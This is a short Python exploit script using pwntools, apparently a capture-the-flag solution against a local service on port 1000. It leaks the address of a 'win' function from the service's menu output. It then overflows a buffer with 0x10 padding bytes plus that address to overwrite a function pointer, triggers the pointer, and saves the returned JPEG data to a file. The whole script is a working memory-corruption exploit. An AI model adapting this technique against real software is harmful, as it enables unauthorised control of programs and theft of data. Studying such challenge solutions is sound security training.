from pwn import *
import re
HEX_RE=r"0x[0-9a-f]+"

# Connect to the service
p = remote("localhost", 1000)
# Leak the win function address
p.recvuntil("cmd> ")
p.sendline("1")
ln = p.recvuntil("}")
# Parse the address
addr = int(re.findall(HEX_RE, str(ln, "utf-8"))[0], 16)
print(f"Address at {hex(addr)}")
# Construct payload: overflow fptr with win function
payload = b""
payload +=  b"A" * 0x10
payload += p64(addr)
print("Payload: ", payload)
p.recvuntil("cmd> ")
# Send payload
p.sendline(payload)
p.recvuntil("cmd> ")
# Call function pointer
p.sendline("3")
p.recvuntil("cmd> ")
jfif = p.recvuntil("1. List files.")
# Grab the jpg output and write to file
with open("fawn-recovered.jpg", "wb") as f:
    f.write(jfif)
# done!